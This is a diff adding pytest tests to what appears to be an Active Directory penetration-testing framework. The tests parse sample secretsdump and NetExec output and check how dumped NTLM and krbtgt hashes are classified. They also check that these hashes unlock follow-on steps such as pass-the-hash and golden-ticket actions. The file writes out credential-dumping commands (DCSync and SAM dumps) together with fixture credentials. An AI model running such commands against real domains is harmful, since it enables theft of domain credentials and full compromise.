@@ -356,3 +356,89 @@ def test_asrep_hash_parser_produces_candidate_material_only():
     assert {"hash.asrep", "credential.candidate"} <= kinds
     assert "credential.available" not in kinds
     assert "access.admin" not in kinds
+
+
+def test_secretsdump_ntds_records_loot_and_krbtgt_as_crackable_material():
+    ws = _workspace()
+    ws.facts.add(Fact("ad.domain_known", "domain:acme.corp", {"name": "acme.corp"}, source="test"))
+    action = next(action for action in load_pack() if action.id == "dcsync")
+    out = r"""
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+acme.corp\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::
+acme.corp\jdoe:1104:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+acme.corp\mwallace:1105:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+[*] Kerberos keys grabbed
+"""
+    facts = parse_action_output(
+        action,
+        ws,
+        "impacket-secretsdump 'acme.corp/dumpsvc:Passw0rd!'@10.10.10.10 -just-dc",
+        out,
+        "",
+        "test",
+    )
+    kinds = {fact.kind for fact in facts}
+    # The win is recorded: domain secrets looted, krbtgt captured, NTLM material present.
+    assert {"hash.ntlm", "hash.krbtgt", "loot.ntds", "credential.candidate"} <= kinds
+    ntlm = next(fact for fact in facts if fact.kind == "hash.ntlm")
+    assert ntlm.value["count"] == 4
+    assert {entry["user"] for entry in ntlm.value["entries"]} == {"Administrator", "krbtgt", "jdoe", "mwallace"}
+    assert ntlm.scope == "domain:acme.corp"
+    candidate = next(fact for fact in facts if fact.kind == "credential.candidate")
+    assert candidate.value["kind"] == "ntlm_hash"
+    # But a raw hash is crackable/reusable material, not a validated login or new access.
+    assert "credential.available" not in kinds
+    assert "credential.plaintext" not in kinds
+    assert "access.admin" not in kinds
+    assert "access.system" not in kinds
+
+
+def test_nxc_local_sam_dump_is_material_not_domain_loot():
+    ws = _workspace()
+    action = next(action for action in load_pack() if action.id == "dump-secrets")
+    # A local SAM dump: no krbtgt, no NTDS/DRSUAPI context -> not domain loot.
+    out = r"""
+SMB         10.10.10.10     445    WS01     [*] Dumping SAM hashes
+SMB         10.10.10.10     445    WS01     Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+SMB         10.10.10.10     445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+"""
+    facts = parse_action_output(
+        action,
+        ws,
+        "nxc smb 10.10.10.10 -u localadmin -p 'hunter2' --sam",
+        out,
+        "",
+        "test",
+    )
+    kinds = {fact.kind for fact in facts}
+    assert {"hash.ntlm", "credential.candidate"} <= kinds
+    assert "loot.ntds" not in kinds
+    assert "hash.krbtgt" not in kinds
+
+
+def test_nxc_ntds_hashes_unlock_pass_the_hash_and_golden_ticket():
+    ws = _workspace()
+    action = next(action for action in load_pack() if action.id == "dcsync")
+    out = r"""
+SMB         10.10.10.10     445    DC01     [*] Dumping the NTDS, this could take a while
+SMB         10.10.10.10     445    DC01     acme.corp\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.10     445    DC01     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::
+SMB         10.10.10.10     445    DC01     acme.corp\sqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB         10.10.10.10     445    DC01     [+] Dumped 3 NTDS.DIT secrets
+"""
+    facts = parse_action_output(
+        action,
+        ws,
+        "nxc smb 10.10.10.10 -u dumpsvc -p 'Passw0rd!' --ntds",
+        out,
+        "",
+        "test",
+    )
+    for fact in facts:
+        ws.facts.add(fact)
+    unlocked = {action.id for action in next_actions(ws.facts)}
+    # hash.ntlm unlocks lateral movement by pass-the-hash; hash.krbtgt unlocks golden ticket.
+    assert "lateral-exec" in unlocked
+    assert "golden-ticket" in unlocked
